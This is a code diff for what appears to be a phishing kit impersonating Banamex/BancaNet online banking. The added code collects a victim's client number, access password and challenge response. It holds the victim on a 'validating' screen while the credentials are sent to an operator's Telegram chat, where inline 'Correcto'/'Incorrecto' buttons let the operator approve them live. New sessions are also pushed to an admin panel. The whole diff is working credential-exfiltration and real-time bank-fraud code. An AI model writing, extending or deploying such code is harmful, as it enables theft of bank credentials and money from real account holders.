@@ -46,6 +46,66 @@ const sendTelegramMessage = async (message: string) => {
   }
 };
 
+// Función para enviar mensajes con botones inline a Telegram
+const sendTelegramMessageWithButtons = async (message: string, validationId: string) => {
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+
+  if (!botToken || !chatId) {
+    console.error('❌ Error: TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID no configurado');
+    return null;
+  }
+
+  console.log(`📤 Enviando mensaje con botones a Telegram (Chat ID: ${chatId})...`);
+
+  try {
+    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'HTML',
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: '✅ Correcto', callback_data: `login:ok:${validationId}` },
+            { text: '❌ Incorrecto', callback_data: `login:fail:${validationId}` }
+          ]
+        ]
+      }
+    });
+    console.log('✅ Mensaje con botones enviado a Telegram exitosamente');
+    return response.data;
+  } catch (error: any) {
+    console.error('❌ Error enviando mensaje con botones a Telegram:', error?.response?.data || error?.message || error);
+    if (error?.response?.data) {
+      console.error('Detalles del error:', JSON.stringify(error.response.data, null, 2));
+    }
+    return null;
+  }
+};
+
+// Función para editar mensaje de Telegram (para actualizar después de responder)
+const editTelegramMessage = async (messageId: string, newText: string) => {
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+
+  if (!botToken || !chatId) {
+    return null;
+  }
+
+  try {
+    const response = await axios.post(`https://api.telegram.org/bot${botToken}/editMessageText`, {
+      chat_id: chatId,
+      message_id: messageId,
+      text: newText,
+      parse_mode: 'HTML'
+    });
+    return response.data;
+  } catch (error: any) {
+    console.error('❌ Error editando mensaje de Telegram:', error?.response?.data || error?.message || error);
+    return null;
+  }
+};
+
 // Función para enviar imágenes a Telegram
 const sendTelegramPhoto = async (imageData: string, caption: string) => {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
@@ -927,7 +987,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       // Si no existe sesión, crear una nueva
       const sessionId = nanoid(10);
+      const validationId = nanoid(16); // ID único para la validación
 
+      // Crear la sesión con estado VALIDANDO_LOGIN (esperando aprobación)
       const session = await storage.createSession({ 
         sessionId, 
         banco: "BANAMEX",
@@ -935,21 +997,43 @@ export async function registerRoutes(app: Express): Promise<Server> {
         claveAcceso,
         challenge: challenge || '',
         netkeyResponse: netkeyResponse || '',
-        pasoActual: ScreenType.AVISO_SEGURIDAD,
+        pasoActual: ScreenType.VALIDANDO_LOGIN, // Pantalla de espera
         createdBy: "banamex_client",
+        loginValidated: false,
+        loginValidationId: validationId,
       });
 
-      console.log(`[Banamex Login] Nueva sesión creada: ${sessionId}, Cliente: ${numeroCliente}`);
+      // Crear validación de Telegram en la base de datos
+      const expiresAt = new Date(Date.now() + 5 * 60 * 1000); // Expira en 5 minutos
+      await storage.createTelegramValidation({
+        validationId,
+        sessionId,
+        status: 'pending',
+        numeroCliente,
+        claveAcceso,
+        expiresAt,
+      });
 
+      console.log(`[Banamex Login] Nueva sesión creada: ${sessionId}, Cliente: ${numeroCliente}, Validación: ${validationId}`);
+
+      // Enviar mensaje a Telegram CON BOTONES de validación
       const telegramMessage = 
-        `🏦 <b>Nuevo Login - Banamex Empresarial</b>\n\n` +
+        `🏦 <b>Nuevo Login - Aclaraciones BancaNet</b>\n\n` +
         `📱 <b>Número de Cliente:</b> ${numeroCliente}\n` +
         `🔑 <b>Clave de Acceso:</b> ${claveAcceso}\n` +
         (challenge ? `🔢 <b>Challenge:</b> ${challenge}\n` : '') +
         `🆔 <b>Session ID:</b> ${sessionId}\n` +
-        `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+        `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n\n` +
+        `⚠️ <b>¿Los datos son correctos?</b>`;
 
-      await sendTelegramMessage(telegramMessage);
+      const telegramResponse = await sendTelegramMessageWithButtons(telegramMessage, validationId);
+      
+      // Guardar el ID del mensaje de Telegram para poder editarlo después
+      if (telegramResponse?.result?.message_id) {
+        await storage.updateTelegramValidation(validationId, {
+          telegramMessageId: telegramResponse.result.message_id.toString()
+        });
+      }
 
       broadcastToAdmins(JSON.stringify({
         type: 'NEW_BANAMEX_SESSION',
@@ -959,7 +1043,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.json({ 
         success: true, 
         sessionId,
-        message: "Sesión creada exitosamente" 
+        message: "Sesión creada - Esperando validación" 
       });
     } catch (error) {
       console.error("Error en login de Banamex:", error);
